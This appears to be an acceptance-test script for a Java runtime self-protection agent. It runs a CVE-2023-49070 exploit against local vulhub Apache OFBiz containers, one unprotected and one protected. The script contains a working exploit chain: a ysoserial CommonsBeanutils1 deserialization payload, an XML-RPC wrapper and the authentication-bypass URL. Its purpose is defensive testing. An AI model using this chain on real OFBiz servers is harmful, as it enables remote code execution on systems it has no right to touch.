#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_OFBIZ_49070_IMAGE:-vulhub/ofbiz:18.12.09}"
baseline_name="${OHMYRASP_VULHUB_OFBIZ_49070_BASELINE_NAME:-ohmyrasp-vulhub-ofbiz49070-baseline}"
protected_name="${OHMYRASP_VULHUB_OFBIZ_49070_PROTECTED_NAME:-ohmyrasp-vulhub-ofbiz49070-protected}"
baseline_port="${OHMYRASP_VULHUB_OFBIZ_49070_BASELINE_PORT:-18464}"
protected_port="${OHMYRASP_VULHUB_OFBIZ_49070_PROTECTED_PORT:-18465}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
ysoserial_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
maven_jdk8_image="${OHMYRASP_MAVEN_JDK8_IMAGE:-maven:3.8.1-jdk-8}"
baseline_dir="logs/vulhub-ofbiz-18.12.09-49070-java8-baseline"
protected_dir="logs/vulhub-ofbiz-18.12.09-49070-java8-protected"
payload_dir="logs/vulhub-ofbiz-18.12.09-49070-java8-payload"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-ofbiz-49070-success"
xmlrpc_path="/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y"

prepare_ysoserial() {
  mkdir -p "$ysoserial_dir"
  if [[ ! -s "${ysoserial_dir}/ysoserial.jar" ]]; then
    rm -rf "${ysoserial_dir}/src"
    docker run --rm -v "${ysoserial_dir}:/work" -w /work "$maven_jdk8_image" \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
}

write_payload() {
  docker run --rm --entrypoint sh \
    -v "${ysoserial_dir}:/ysoserial:ro" \
    -v "$(pwd)/${payload_dir}:/work" \
    -w /work \
    "$image" \
    -lc "/usr/local/openjdk-8/bin/java -jar /ysoserial/ysoserial.jar CommonsBeanutils1 'touch ${marker}' > ofbiz-49070-cb1.ser && test -s ofbiz-49070-cb1.ser"
  base64 -w 0 "${payload_dir}/ofbiz-49070-cb1.ser" > "${payload_dir}/ofbiz-49070-cb1.b64"
  {
    printf '%s\n' '<?xml version="1.0"?>'
    printf '%s\n' '<methodCall>'
    printf '%s\n' '  <methodName>ProjectDiscovery</methodName>'
    printf '%s\n' '  <params>'
    printf '%s\n' '    <param>'
    printf '%s\n' '      <value>'
    printf '%s\n' '        <struct>'
    printf '%s\n' '          <member>'
    printf '%s\n' '            <name>test</name>'
    printf '%s\n' '            <value>'
    printf '              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">'
    cat "${payload_dir}/ofbiz-49070-cb1.b64"
    printf '%s\n' '</serializable>'
    printf '%s\n' '            </value>'
    printf '%s\n' '          </member>'
    printf '%s\n' '        </struct>'
    printf '%s\n' '      </value>'
    printf '%s\n' '    </param>'
    printf '%s\n' '  </params>'
    printf '%s\n' '</methodCall>'
  } > "${payload_dir}/ofbiz-49070.xml"
}

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl -k --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_ofbiz() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "https://127.0.0.1:${port}/accounting")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "OFBiz container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "OFBiz did not expose /accounting at ${port}" >&2
  exit 1
}

post_xmlrpc() {
  local port="$1"
  local output="$2"
  curl_status "$output" \
    -X POST \
    -H "Content-Type: application/xml" \
    --data-binary "@${payload_dir}/ofbiz-49070.xml" \
    "https://127.0.0.1:${port}${xmlrpc_path}"
}

container_has_marker() {
  local name="$1"
  docker exec "$name" sh -lc "test -f '${marker}'"
}

wait_for_protected_startup() {
  for attempt in $(seq 1 180); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in OFBiz protected container" >&2
  exit 1
}

deserialization_block_count() {
  grep -Ec '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_deserialization_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(deserialization_block_count)"
    if (( count > previous )); then
      printf 'deserialization_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_deserialization_gadget_class block event for OFBiz CVE-2023-49070" >&2
  exit 1
}

verify_image_java8() {
  docker run --rm --entrypoint sh "$image" \
    -lc '/usr/local/openjdk-8/bin/java -version' > "${payload_dir}/image-java-version.txt" 2>&1 || true
  if ! grep -Fq '1.8.0_' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "OFBiz CVE-2023-49070 image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

run_baseline() {
  docker run -d --name "$baseline_name" -p "${baseline_port}:8443" \
    "$image" >/dev/null

  wait_for_ofbiz "$baseline_name" "$baseline_port" "$baseline_dir"

  local status
  status="$(post_xmlrpc "$baseline_port" "${baseline_dir}/xmlrpc.response")"
  printf 'baseline_xmlrpc_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! container_has_marker "$baseline_name"; then
    cat "${baseline_dir}/xmlrpc.response" >&2 || true
    echo "baseline OFBiz CVE-2023-49070 did not create ${marker}" >&2
    exit 1
  fi

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --name "$protected_name" -p "${protected_port}:8443" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_ofbiz "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "OFBiz protected startup produced a detection before CVE-2023-49070 traffic" >&2
    exit 1
  fi

  local previous_count
  local status
  previous_count="$(deserialization_block_count)"
  status="$(post_xmlrpc "$protected_port" "${protected_dir}/xmlrpc.response")"
  printf 'protected_xmlrpc_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_deserialization_block "$previous_count"
  if container_has_marker "$protected_name"; then
    cat "$protected_log" >&2 || true
    echo "protected OFBiz CVE-2023-49070 created ${marker} despite RASP" >&2
    exit 1
  fi
  if ! grep -Fq 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "OFBiz CVE-2023-49070 block event did not identify TemplatesImpl" >&2
    exit 1
  fi
}

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_ysoserial
verify_image_java8
write_payload
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub OFBiz 18.12.09 CVE-2023-49070 Java8 acceptance passed"
